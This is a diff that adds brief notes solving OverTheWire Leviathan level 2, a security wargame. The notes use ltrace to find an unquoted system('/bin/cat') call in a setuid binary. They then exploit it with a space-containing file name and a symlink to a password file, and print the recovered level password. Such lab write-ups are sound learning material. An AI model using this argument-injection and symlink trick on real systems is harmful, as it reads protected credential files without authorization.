@@ -1,0 +1,27 @@
+### Login via SSH
+
+- ls
+- ./printfile
+- ./printfile /etc/leviathan_pass/leviathan3
+- ./printfile .bash_logout
+- ltrace ./printfile .bash_logout
+- ltrace ./printfile .bash_logout .profile # prints only the first file
+
+### Create a file with spaces
+
+- tmp_dir=$(mktemp -d)
+- touch $tmp_dir/"test file.txt"
+
+- ltrace ./printfile "test file.txt" # file with spaces
+
+system("/bin/cat /tmp/tmp.7k7ItjqIfU/tes".../bin/cat: file.txt: No such file or directory
+
+/bin/cat command takes the files up until the space
+
+- ln -s /etc/leviathan_pass/leviathan3 /tmp/tmp.7k7ItjqIfU/test
+
+- chmod /tmp/tmp.7k7ItjqIfU
+
+- ./printfile "test file.txt"
+
+leviathan3 password -> f0n8h2iWLP
